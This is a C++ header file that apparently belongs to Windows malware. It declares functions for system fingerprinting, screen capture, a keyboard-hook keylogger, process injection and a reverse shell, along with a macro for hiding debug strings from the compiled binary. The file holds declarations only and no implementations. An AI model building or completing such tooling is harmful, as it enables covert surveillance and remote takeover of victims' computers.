#pragma once

#include <winsock2.h>
#include <d3d9.h>
#include <stddef.h>
#include <iostream>
#include <WS2tcpip.h>
#include <tlhelp32.h>
#include <io.h>
#include <comdef.h> 
#include <unordered_map>
using namespace std;

#define DEBUG 0

#define MAX_THREADS 3
#define BUF_SIZE 255
#define MAX_COMP_NAME 50
#define USERNAME_BUF 120
#define CPU_STR_SIZE 0x40
#define HOST_STR_SIZE 200
#define SHA256_DIGEST_LENGTH 65
#define RSHELL_MAX_ATTEMPTS 5

/*--------------------------------------------------------------------
	A little macro that helps hiding the debug code and strings 
	from the compiled binary when DEBUG is 0
--------------------------------------------------------------------*/
#if DEBUG
#define DEBUG_CODE(x){x}
#else
#define DEBUG_CODE(x)
#endif


#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "d3d9.lib")
#pragma comment(lib, "crypt32.lib")


// Utility
void GetCPUDescription(char*);
void GetGPUDescription(char*);
void GetDesktopResolution(PDWORD, PDWORD);
void GetMutexStr(char*);
void sha256(char* str, char* outputBuffer);
char* UnicodeToAnsi(LPCWSTR);

void CaptureSS();

// KeyLogger
int isCapsLock();
BOOL CheckWindow(HWND);
DWORD WINAPI InstallHook(LPVOID);
DWORD WINAPI WindowWatcher(LPVOID);
LRESULT CALLBACK LowLevelKeyboardProc(int, WPARAM, LPARAM);
void LookupCode(unordered_map<int, char*>*, int);
void LogToFile(char*);
VOID CALLBACK KillWwatcher(ULONG_PTR);

// Injector
BOOL FindTargetProcess(char*, char*, BOOL);
BOOL inject(char*, HANDLE);
PVOID GetExpFuncVA(char*, HMODULE, BOOL, char*, WORD);
BOOL InitPayload(HANDLE, char*, HMODULE);

// Reverse Shell
DWORD WINAPI RunRShell(LPVOID);